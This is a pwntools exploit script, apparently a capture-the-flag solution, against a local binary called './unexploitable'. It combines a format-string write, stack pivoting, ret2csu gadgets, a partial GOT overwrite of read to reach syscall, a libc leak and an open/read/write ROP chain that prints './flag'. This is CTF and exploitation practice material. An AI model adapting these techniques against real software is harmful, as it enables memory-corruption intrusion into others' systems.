#coding=utf-8
from pwn import*
import time
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./unexploitable')
elf = ELF('./unexploitable')
libc = ELF('./libc.so.6')

def pr(a,addr):
	log.success(a+': '+hex(addr))

csu_init_gadget1 = 0x4009e0
'''
mov     rdx, r15
mov     rsi, r14
mov     edi, r13d
call    qword ptr [r12+rbx*8]
'''
csu_init_gadget2 = 0x4009fa
'''
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
'''
def csu_rop(rbx, rbp, call, rdi, rsi, rdx, ret):
	rop  = p64(rbx)
	rop += p64(rbp)
	rop += p64(call)
	rop += p64(rdi)
	rop += p64(rsi)
	rop += p64(rdx)
	rop += p64(ret)
	return rop

libc_start_main = elf.got["__libc_start_main"]
read_got = elf.got["read"] # 0x601040
extern_read = 0x6010c0
pop_rbp_ret = 0x4007d8
leave_ret = 0x400914

p.recvuntil("Here's your gift: ")
data_addr = int(p.recv(14),16)

rbp_addr = data_addr + 0x810
ROP_chain = data_addr + 0x120

pr("rbp_addr",rbp_addr)
pr('ROP_chain', ROP_chain)

payload = fmtstr_payload(offset=6,
	writes={rbp_addr:ROP_chain-8, rbp_addr+8:leave_ret},
	write_size_max="byte",write_size="byte")
payload = payload.ljust(0x120,'\x00')

payload += p64(csu_init_gadget2)
payload += csu_rop(0,1,read_got,0,extern_read,0x300,csu_init_gadget1)
payload += "\x00"*0x38 #pad
payload += p64(pop_rbp_ret) #set rbp
payload += p64(extern_read-0x8)
payload += p64(leave_ret) #migrate 栈迁移

#gdb.attach(p)
#pause()
time.sleep(1)
p.send(payload)
p.recv()

context_addr = extern_read + 0x278

payload2  = p64(csu_init_gadget2)
payload2 += csu_rop(0,1,read_got,0,read_got,0x1,csu_init_gadget1) #modify LSB of read_got

for i in range(6):
	payload2 += p64(0) #padding<-rsp, 之后执行 csu_init_gadget2，系统调用 write
	payload2 += csu_rop(0,1,read_got,1,libc_start_main+i,0x1,csu_init_gadget1)

payload2 += p64(0) 
payload2 += csu_rop(0,1,read_got,1,libc_start_main,0x0,csu_init_gadget1) #make rax=0

payload2 += p64(0) #padding<-rsp
payload2 += csu_rop(0,1,read_got,0,context_addr,0x200,csu_init_gadget1) #输入payload3到context_addr
payload2 += "A"*0x38 #pad,之后接 orw_rop<-context_addr

#gdb.attach(p)
#pause()
time.sleep(1)
p.send(payload2)
p.recv()

#gdb.attach(p)
#pause()
time.sleep(1)
p.send('\x90') #read 低字节修改为 syscal 的低字节 0x90

libcbase = u64(p.recv(6).ljust(8,"\x00")) - libc.symbols["__libc_start_main"]
pr("libcbase",libcbase)

bss_addr = libcbase + libc.bss()
syscall_ret = libcbase + 0x91396 # syscall;ret
prdx_ret = libcbase + 0x11f497 # pop rdx ; pop r12 ; ret
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret
prsi_ret = libcbase + 0x2be51  # pop rsi ; ret
prax_ret = libcbase + 0x45eb0  # pop rax ; ret

def orw_rop(rdi,rsi,rdx,rax):
	orw  = p64(prdi_ret) + p64(rdi)
	orw += p64(prsi_ret) + p64(rsi)
	orw += p64(prdx_ret) + p64(rdx) + p64(0)
	orw += p64(prax_ret) + p64(rax)
	orw += p64(syscall_ret)
	return orw

payload3  = orw_rop(context_addr+0x100,0,0,2) #open
payload3 += orw_rop(3,bss_addr,0x30,0) #read
payload3 += orw_rop(1,bss_addr,0x30,1) #wirte
payload3  = payload3.ljust(0x100,'\x00') + './flag\x00\x00'

#gdb.attach(p)
#pause()
time.sleep(1)
p.send(payload3)

p.interactive()
